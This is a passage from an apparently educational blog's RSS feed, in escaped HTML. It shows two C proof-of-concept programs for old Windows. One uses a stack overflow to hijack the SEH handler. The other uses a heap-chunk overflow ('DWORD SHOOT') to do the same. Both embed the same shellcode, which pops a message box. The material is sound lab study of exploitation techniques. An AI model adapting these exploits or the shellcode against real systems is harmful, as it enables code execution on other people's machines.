+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// Next SEH Record
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x98\xFE\x12\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// SEH Handler
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DWORD&lt;/span> &lt;span class="nf">MyExceptionhandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;got an exception, press Enter to kill process!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ExitProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">zero&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//overrun the stack
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">zero&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">zero&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//generate an exception
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_except&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MyExceptionhandler&lt;/span>&lt;span class="p">()){}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcode&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="watch">Watch&lt;/h4>
+&lt;ul>
+&lt;li>Popup MessageBox dialog successfully&lt;/li>
+&lt;/ul>
+&lt;h2 id="sehs-heap-utilization-test">SEH&amp;rsquo;s heap utilization test&lt;/h2>
+&lt;h3 id="actual-test-1">Actual test&lt;/h3>
+&lt;h4 id="code-2">Code&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x16\x01\x1A\x00\x00\x10\x00\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// head of the ajacent free block
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x88\x06\x30\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// 0x00300688 is the address of shellcode in first
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Heapblock
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x30\xFF\x12\x00&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// target of DWORD SHOOT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">DWORD&lt;/span> &lt;span class="nf">MyExceptionhandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ExitProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HLOCAL&lt;/span> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapCreate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x10000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// over flow here, noticed 0x200 means
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//512 !
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__asm&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">// uesd to break the process
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__try&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HeapAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HEAP_ZERO_MEMORY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__except&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MyExceptionhandler&lt;/span>&lt;span class="p">()){}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
